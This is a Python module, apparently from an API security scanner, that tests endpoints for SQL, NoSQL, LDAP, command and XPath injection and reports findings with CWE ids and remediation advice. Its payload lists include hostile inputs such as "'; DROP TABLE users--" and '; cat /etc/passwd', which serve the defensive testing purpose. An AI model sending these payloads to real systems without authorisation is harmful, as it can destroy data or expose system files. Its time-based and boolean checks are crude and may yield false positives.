"""
Injection Vulnerability Tester

Detects various types of injection vulnerabilities including SQL injection,
NoSQL injection, LDAP injection, and command injection in API endpoints.
"""

import re
import json
import urllib.parse
from typing import List, Dict, Any, Optional, Set
import aiohttp

from .base_detector import BaseVulnerabilityDetector, VulnerabilityResult, Severity


class InjectionTester(BaseVulnerabilityDetector):
    """
    Detector for various injection vulnerabilities in API endpoints
    
    Tests for SQL injection, NoSQL injection, LDAP injection, command injection,
    and other common injection attack vectors.
    """

    def __init__(self, session: aiohttp.ClientSession, config: Dict[str, Any] = None):
        super().__init__(session, config)

        # SQL injection payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND SLEEP(5)--",
            "' OR BENCHMARK(1000000,MD5(1))--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1 limit 1 -- -+",
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' ORDER BY 3--+",
            "' AND 1=2 UNION SELECT 1,2,3--",
        ]

        # NoSQL injection payloads
        self.nosql_payloads = [
            {"$ne": None},
            {"$ne": ""},
            {"$regex": ".*"},
            {"$where": "1==1"},
            {"$or": [{"x": {"$ne": 1}}, {"x": {"$exists": False}}]},
            {"$gt": ""},
            {"$gte": ""},
            {"$lt": ""},
            {"$lte": ""},
            {"$in": ["admin", "user"]},
            {"$nin": [""]},
        ]

        # LDAP injection payloads
        self.ldap_payloads = [
            "*",
            "*)(&",
            "*))%00",
            ")(cn=*))(|(cn=*",
            "admin)(&(password=*))",
            "*)(uid=*))(|(uid=*",
        ]

        # Command injection payloads
        self.command_payloads = [
            "; ls",
            "| ls",
            "&& ls",
            "|| ls",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; whoami",
            "| whoami",
            "&& whoami",
            "`ls`",
            "$(ls)",
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
        ]

        # XPath injection payloads
        self.xpath_payloads = [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "x' or name()='username' or 'x'='y",
            "' or position()=1 or ''='",
            "test' and count(/*)=1 and 'test'='test",
        ]

        # Error patterns for different injection types
        self.error_patterns = {
            'sql': [
                r'SQL syntax.*MySQL',
                r'Warning.*mysql_.*',
                r'MySQLSyntaxErrorException',
                r'valid MySQL result',
                r'PostgreSQL.*ERROR',
                r'Warning.*pg_.*',
                r'valid PostgreSQL result',
                r'SQLite.*error',
                r'sqlite3\.OperationalError',
                r'ORA-\d+.*',
                r'Oracle error',
                r'Oracle.*OCI.*',
                r'Warning.*oci_.*',
                r'Microsoft.*ODBC.*SQL Server',
                r'SQLServer JDBC Driver',
                r'SqlException',
                r'System\.Data\.SqlClient\.SqlException',
                r'Unclosed quotation mark after the character string',
                r'quoted string not properly terminated',
            ],
            'nosql': [
                r'MongoError',
                r'CouchDB.*error',
                r'RethinkDB.*error',
                r'Redis.*error',
                r'Neo4j.*error',
                r'Cassandra.*error',
                r'MongoDB.*Error',
                r'db\..*\.find',
                r'\$where.*error',
            ],
            'ldap': [
                r'javax\.naming\.directory',
                r'LDAPException',
                r'com\.sun\.jndi\.ldap',
                r'Invalid DN syntax',
                r'LDAP.*error',
            ],
            'command': [
                r'sh:.*command not found',
                r'bash:.*command not found',
                r'/bin/sh',
                r'/bin/bash',
                r'cmd\.exe',
                r'command not found',
                r'permission denied',
                r'cannot execute',
                r'sh:.*syntax error',
            ],
            'xpath': [
                r'XPath.*error',
                r'XPathException',
                r'xpath.*syntax',
                r'libxml2.*error',
                r'XMLSyntaxError',
            ]
        }

    async def detect(self, endpoint: str, method: str = "GET",
                     params: Dict[str, Any] = None,
                     headers: Dict[str, str] = None,
                     data: Dict[str, Any] = None) -> List[VulnerabilityResult]:
        """
        Detect injection vulnerabilities in the given endpoint
        
        Args:
            endpoint: API endpoint to test
            method: HTTP method
            params: Query parameters
            headers: HTTP headers
            data: Request body data
            
        Returns:
            List of injection vulnerabilities found
        """
        results = []

        # Test SQL injection
        results.extend(await self._test_sql_injection(endpoint, method, params, headers, data))

        # Test NoSQL injection
        results.extend(await self._test_nosql_injection(endpoint, method, params, headers, data))

        # Test LDAP injection
        results.extend(await self._test_ldap_injection(endpoint, method, params, headers, data))

        # Test command injection
        results.extend(await self._test_command_injection(endpoint, method, params, headers, data))

        # Test XPath injection
        results.extend(await self._test_xpath_injection(endpoint, method, params, headers, data))

        return results

    async def _test_sql_injection(self, endpoint: str, method: str,
                                  params: Dict[str, Any] = None,
                                  headers: Dict[str, str] = None,
                                  data: Dict[str, Any] = None) -> List[VulnerabilityResult]:
        """Test for SQL injection vulnerabilities"""
        results = []

        # Test query parameters
        if params:
            for param_name, param_value in params.items():
                for payload in self.sql_payloads:
                    # Test string injection
                    modified_params = params.copy()
                    modified_params[param_name] = payload

                    vulnerability = await self._test_injection_payload(
                        endpoint, method, 'sql', payload, param_name, 'query_param',
                        params=modified_params, headers=headers, data=data
                    )

                    if vulnerability:
                        results.append(vulnerability)

                    await self.rate_limit_delay()

                    # Test numeric injection (if original value was numeric)
                    if str(param_value).isdigit():
                        numeric_payload = f"{param_value}{payload}"
                        modified_params[param_name] = numeric_payload

                        vulnerability = await self._test_injection_payload(
                            endpoint, method, 'sql', numeric_payload, param_name, 'query_param',
                            params=modified_params, headers=headers, data=data
                        )

                        if vulnerability:
                            results.append(vulnerability)

                        await self.rate_limit_delay()

        # Test JSON body parameters
        if data and method in ['POST', 'PUT', 'PATCH']:
            results.extend(await self._test_json_sql_injection(endpoint, method, data, headers))

        return results

    async def _test_nosql_injection(self, endpoint: str, method: str,
                                    params: Dict[str, Any] = None,
                                    headers: Dict[str, str] = None,
                                    data: Dict[str, Any] = None) -> List[VulnerabilityResult]:
        """Test for NoSQL injection vulnerabilities"""
        results = []

        # NoSQL injection is primarily tested in JSON bodies
        if data and method in ['POST', 'PUT', 'PATCH']:
            for field_name, field_value in data.items():
                for payload in self.nosql_payloads:
                    modified_data = data.copy()
                    modified_data[field_name] = payload

                    vulnerability = await self._test_injection_payload(
                        endpoint, method, 'nosql', str(payload), field_name, 'json_body',
                        params=params, headers=headers, data=modified_data
                    )

                    if vulnerability:
                        results.append(vulnerability)

                    await self.rate_limit_delay()

        return results

    async def _test_ldap_injection(self, endpoint: str, method: str,
                                   params: Dict[str, Any] = None,
                                   headers: Dict[str, str] = None,
                                   data: Dict[str, Any] = None) -> List[VulnerabilityResult]:
        """Test for LDAP injection vulnerabilities"""
        results = []

        # Test query parameters
        if params:
            for param_name, param_value in params.items():
                for payload in self.ldap_payloads:
                    modified_params = params.copy()
                    modified_params[param_name] = payload

                    vulnerability = await self._test_injection_payload(
                        endpoint, method, 'ldap', payload, param_name, 'query_param',
                        params=modified_params, headers=headers, data=data
                    )

                    if vulnerability:
                        results.append(vulnerability)

                    await self.rate_limit_delay()

        # Test JSON body parameters
        if data and method in ['POST', 'PUT', 'PATCH']:
            for field_name, field_value in data.items():
                if isinstance(field_value, str):
                    for payload in self.ldap_payloads:
                        modified_data = data.copy()
                        modified_data[field_name] = payload

                        vulnerability = await self._test_injection_payload(
                            endpoint, method, 'ldap', payload, field_name, 'json_body',
                            params=params, headers=headers, data=modified_data
                        )

                        if vulnerability:
                            results.append(vulnerability)

                        await self.rate_limit_delay()

        return results

    async def _test_command_injection(self, endpoint: str, method: str,
                                      params: Dict[str, Any] = None,
                                      headers: Dict[str, str] = None,
                                      data: Dict[str, Any] = None) -> List[VulnerabilityResult]:
        """Test for command injection vulnerabilities"""
        results = []

        # Test query parameters
        if params:
            for param_name, param_value in params.items():
                for payload in self.command_payloads:
                    # Append to existing value
                    modified_params = params.copy()
                    modified_params[param_name] = f"{param_value}{payload}"

                    vulnerability = await self._test_injection_payload(
                        endpoint, method, 'command', payload, param_name, 'query_param',
                        params=modified_params, headers=headers, data=data
                    )

                    if vulnerability:
                        results.append(vulnerability)

                    await self.rate_limit_delay()

        # Test JSON body parameters
        if data and method in ['POST', 'PUT', 'PATCH']:
            for field_name, field_value in data.items():
                if isinstance(field_value, str):
                    for payload in self.command_payloads:
                        modified_data = data.copy()
                        modified_data[field_name] = f"{field_value}{payload}"

                        vulnerability = await self._test_injection_payload(
                            endpoint, method, 'command', payload, field_name, 'json_body',
                            params=params, headers=headers, data=modified_data
                        )

                        if vulnerability:
                            results.append(vulnerability)

                        await self.rate_limit_delay()

        return results

    async def _test_xpath_injection(self, endpoint: str, method: str,
                                    params: Dict[str, Any] = None,
                                    headers: Dict[str, str] = None,
                                    data: Dict[str, Any] = None) -> List[VulnerabilityResult]:
        """Test for XPath injection vulnerabilities"""
        results = []

        # Test query parameters
        if params:
            for param_name, param_value in params.items():
                for payload in self.xpath_payloads:
                    modified_params = params.copy()
                    modified_params[param_name] = payload

                    vulnerability = await self._test_injection_payload(
                        endpoint, method, 'xpath', payload, param_name, 'query_param',
                        params=modified_params, headers=headers, data=data
                    )

                    if vulnerability:
                        results.append(vulnerability)

                    await self.rate_limit_delay()

        # Test JSON body parameters
        if data and method in ['POST', 'PUT', 'PATCH']:
            for field_name, field_value in data.items():
                if isinstance(field_value, str):
                    for payload in self.xpath_payloads:
                        modified_data = data.copy()
                        modified_data[field_name] = payload

                        vulnerability = await self._test_injection_payload(
                            endpoint, method, 'xpath', payload, field_name, 'json_body',
                            params=params, headers=headers, data=modified_data
                        )

                        if vulnerability:
                            results.append(vulnerability)

                        await self.rate_limit_delay()

        return results

    async def _test_json_sql_injection(self, endpoint: str, method: str,
                                       data: Dict[str, Any],
                                       headers: Dict[str, str] = None) -> List[VulnerabilityResult]:
        """Test SQL injection in JSON body fields"""
        results = []

        for field_name, field_value in data.items():
            if isinstance(field_value, str):
                for payload in self.sql_payloads:
                    modified_data = data.copy()
                    modified_data[field_name] = payload

                    vulnerability = await self._test_injection_payload(
                        endpoint, method, 'sql', payload, field_name, 'json_body',
                        headers=headers, data=modified_data
                    )

                    if vulnerability:
                        results.append(vulnerability)

                    await self.rate_limit_delay()

        return results

    async def _test_injection_payload(self, endpoint: str, method: str,
                                      injection_type: str, payload: str,
                                      param_name: str, location: str,
                                      params: Dict[str, Any] = None,
                                      headers: Dict[str, str] = None,
                                      data: Dict[str, Any] = None) -> Optional[VulnerabilityResult]:
        """Test a specific injection payload and analyze the response"""

        response = await self.make_request(endpoint, method, params, headers, data)
        if not response:
            return None

        response_text = getattr(response, '_text', '')

        # Check for injection indicators
        vulnerability_indicators = []
        severity = Severity.LOW

        # 1. Check for error patterns
        error_patterns = self.error_patterns.get(injection_type, [])
        for pattern in error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                vulnerability_indicators.append(f"Database error pattern detected: {pattern}")
                severity = Severity.HIGH
                break

        # 2. Check for generic error indicators
        if response.status == 500:
            vulnerability_indicators.append("Internal server error triggered by payload")
            severity = Severity.MEDIUM

        # 3. Check for time-based indicators (for blind injection)
        if 'sleep' in payload.lower() or 'benchmark' in payload.lower():
            # Note: Would need to measure response time for accurate detection
            if response.status == 200:
                vulnerability_indicators.append("Potential time-based injection (response analysis needed)")
                severity = Severity.MEDIUM

        # 4. Check for boolean-based indicators
        if injection_type == 'sql' and ("'1'='1" in payload or "1=1" in payload):
            if response.status == 200 and len(response_text) > 100:
                vulnerability_indicators.append("Potential boolean-based SQL injection")
                severity = Severity.MEDIUM

        # 5. Check for union-based indicators
        if 'union' in payload.lower() and response.status == 200:
            vulnerability_indicators.append("Potential UNION-based SQL injection")
            severity = Severity.HIGH

        # 6. Check for NoSQL-specific indicators
        if injection_type == 'nosql':
            # Look for MongoDB-style errors or unexpected data
            mongodb_patterns = [
                r'\$where',
                r'\$regex',
                r'\$ne',
                r'ObjectId',
                r'ISODate'
            ]
            for pattern in mongodb_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    vulnerability_indicators.append(f"NoSQL-specific pattern detected: {pattern}")
                    severity = Severity.MEDIUM
                    break

        if not vulnerability_indicators:
            return None

        # Create evidence
        evidence = {
            'injection_type': injection_type,
            'payload': payload,
            'parameter_name': param_name,
            'location': location,
            'status_code': response.status,
            'indicators': vulnerability_indicators,
            'response_sample': response_text[:1000] if response_text else '',
            'error_patterns_matched': [p for p in error_patterns if re.search(p, response_text, re.IGNORECASE)]
        }

        title = f"{injection_type.upper()} Injection in {param_name}"
        description = (
            f"Potential {injection_type} injection vulnerability detected in parameter '{param_name}' "
            f"at {location}. Payload: {payload}. "
            f"Indicators: {', '.join(vulnerability_indicators)}"
        )

        cwe_mapping = {
            'sql': 'CWE-89',
            'nosql': 'CWE-943',
            'ldap': 'CWE-90',
            'command': 'CWE-78',
            'xpath': 'CWE-91'
        }

        remediation_mapping = {
            'sql': "Use parameterized queries or prepared statements. Implement proper input validation and escaping.",
            'nosql': "Use parameterized queries and proper input validation. Avoid dynamic query construction.",
            'ldap': "Use parameterized LDAP queries and proper input validation. Escape special LDAP characters.",
            'command': "Avoid executing user input as system commands. Use safe alternatives and input validation.",
            'xpath': "Use parameterized XPath queries and proper input validation. Escape special XPath characters."
        }

        return self.create_result(
            vuln_type=f"{injection_type.upper()} Injection",
            severity=severity,
            title=title,
            description=description,
            endpoint=endpoint,
            method=method,
            evidence=evidence,
            remediation=remediation_mapping.get(injection_type,
                                                "Implement proper input validation and parameterization"),
            cwe_id=cwe_mapping.get(injection_type, "CWE-20"),
            owasp_category="API8:2023 Security Misconfiguration"
        )
